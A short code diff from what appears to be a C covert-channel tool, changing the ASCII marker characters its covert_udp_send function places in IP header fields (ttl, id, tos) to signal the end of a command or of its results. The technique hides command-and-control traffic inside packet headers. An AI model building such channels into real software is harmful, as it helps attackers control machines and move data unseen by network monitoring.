@@ -128,14 +128,14 @@ void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short 
         ip_header->tos = 'b';
     }else if(covert_channel == 3){
         //end of command
-        ip_header->ttl = 'c';
+        ip_header->ttl = 'r';
         ip_header->id = 'c';  //enter a single ASCII character into the field
         ip_header->tos = 'c';
     }else {
         //end of results
         ip_header->ttl = 'r';
-        ip_header->id = 'r';  //enter a single ASCII character into the field
-        ip_header->tos = 'r';
+        ip_header->id = 'x';  //enter a single ASCII character into the field
+        ip_header->tos = 'x';
     }
     ip_header->ihl = 5;
     ip_header->version = 4;
